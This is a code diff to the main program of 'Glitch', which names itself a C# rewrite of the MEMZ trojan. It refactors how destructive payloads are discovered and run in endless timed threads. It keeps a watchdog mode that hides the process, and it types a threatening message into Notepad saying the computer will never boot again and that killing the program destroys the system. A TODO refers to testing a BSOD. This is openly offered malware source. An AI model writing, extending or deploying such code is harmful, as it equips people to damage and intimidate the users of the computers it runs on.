@@ -10,14 +10,14 @@ using GlitchPayloads;
 #if Watch_Dogs
 using System.Diagnostics;
 using CC_Functions.W32;
+
 #endif
 
 namespace Glitch
 {
     public class Program
     {
-        private static readonly Random Rnd = new Random();
-        public static List<MethodInfo>? payloads;
+        public static List<Tuple<MethodInfo, PayloadAttribute>>? payloads;
 
         public static void Main(string[] args)
         {
@@ -31,25 +31,29 @@ namespace Glitch
             args = args == null || args.Length == 0
                 ? new[] {"form"}
                 : args.Select(s => s.ToLower().TrimStart('-', '/', '\\')).ToArray();
-            payloads = Assembly.GetAssembly(typeof(PayloadAttribute)).GetTypes()
+            payloads = Assembly.GetAssembly(typeof(PayloadClassAttribute)).GetTypes()
                 .Where(s => s.IsClass &&
-                            s.GetCustomAttributes(false).Any(a => a is PayloadAttribute))
+                            s.GetCustomAttributes(false).Any(a => a is PayloadClassAttribute))
                 .SelectMany(s => s.GetMethods()).Where(s =>
                     !s.GetParameters().Any(q => true) && s.GetCustomAttributes(false).Any(a => a is PayloadAttribute))
                 .OrderBy(s => s.GetPayloadName())
-                .ToList();
+                .Select(s => new Tuple<MethodInfo, PayloadAttribute>(s,
+                    (PayloadAttribute) s.GetCustomAttributes(false).First(a => a is PayloadAttribute))).ToList();
             switch (args[0])
             {
                 case "form":
+                    Common.TimePassed = float.PositiveInfinity;
+                    Common.DelayMultiplier = 0.25f;
                     Application.Run(new RunGUI());
                     break;
                 case "list":
                     Console.WriteLine(
-                        string.Join(Environment.NewLine, payloads.Select(s => s.GetPayloadName())));
+                        string.Join(Environment.NewLine, payloads.Select(s => s.Item1.GetPayloadName())));
                     break;
                 case "full":
                     ShowNotepad();
-                    payloads.ForEach(s => new Thread(() => s.Invoke(null, new object[0])).Start());
+                    payloads.ForEach(s => LaunchRunner(s.Item1, s.Item2));
+                    LaunchIncrementor();
 #if Watch_Dogs
                     Wnd32.fromHandle(Process.GetCurrentProcess().MainWindowHandle).shown = false;
                     for (int i = 0; i < WatchDog.WDC; i++)
@@ -60,12 +64,14 @@ namespace Glitch
                     break;
                 case "run":
                     Console.WriteLine("Using payloads:");
-                    payloads.Where(s => args.Skip(1).Any(a => s.GetPayloadName().ToLower() == a)).ToList().ForEach(
-                        s =>
-                        {
-                            Console.WriteLine($"- {s.GetPayloadName()}");
-                            new Thread(() => s.Invoke(null, new object[0])).Start();
-                        });
+                    payloads.Where(s => args.Skip(1).Any(a => s.Item1.GetPayloadName().ToLower() == a)).ToList()
+                        .ForEach(
+                            s =>
+                            {
+                                Console.WriteLine($"- {s.Item1.GetPayloadName()}");
+                                LaunchRunner(s.Item1, s.Item2);
+                            });
+                    LaunchIncrementor();
                     ShowKill();
                     break;
                 case "help":
@@ -85,7 +91,7 @@ namespace Glitch
             Environment.Exit(0);
         }
 
-        private static void ShowHelp()
+        public static void ShowHelp()
         {
             Console.WriteLine("CC24 - Glitch - an (incomplete) rewrite of Leurak's MEMZ in C#"
 #if DEBUG
@@ -109,24 +115,42 @@ namespace Glitch
 #endif
         }
 
-        private static void ShowNotepad()
+        public static void ShowNotepad()
         {
             Process proc = Process.Start("notepad.exe");
             proc.WaitForInputIdle();
             Wnd32.fromHandle(proc.MainWindowHandle).isForeground = true;
-            string msg = @"YOUR COMPUTER HAS BEEN FUCKED BY THE MEMZ TROJAN.
-
-Your computer won't boot up again,
-so use it as long as you can!
-
-:D
-
-Trying to kill MEMZ will cause your system to be
-destroyed instantly, so don't try it :D";
+            const string msg =
+                "YOUR COMPUTER HAS BEEN FUCKED BY GLITCH,\nA REWRITE OF THE MEMZ TROJAN.\n\nYour computer won't boot up again,\nso use it as long as you can!\n\n:D\n\nTrying to kill GLITCH will cause your system to be\ndestroyed instantly, so don't try it :D";
             SendKeys.SendWait(msg);
         }
+
+        public static void LaunchIncrementor()
+        {
+            new Thread(() =>
+            {
+                Thread.Sleep(1000);
+                Common.TimePassed++;
+                Common.DelayMultiplier = Math.Max(240 / Common.TimePassed, float.Epsilon);
+            }).Start();
+        }
+
+        public static void LaunchRunner(MethodInfo method, PayloadAttribute data) => GetRunner(method, data).Start();
+
+        public static Thread GetRunner(MethodInfo method, PayloadAttribute data) =>
+            new Thread(() =>
+            {
+                while (data.RunAfter < Common.TimePassed) Thread.Sleep(1000);
+                while (true)
+                {
+                    method.Invoke(null, new object[0]);
+                    Thread.Sleep(Math.Max((int) (data.DefaultDelay * Common.DelayMultiplier), 50));
+                }
+            });
     }
 }
 
 //TODO: Function to build custom payload collections
 //TODO: Test BSOD
+//TODO: Test payloads
+//TODO: Use custom runner in form
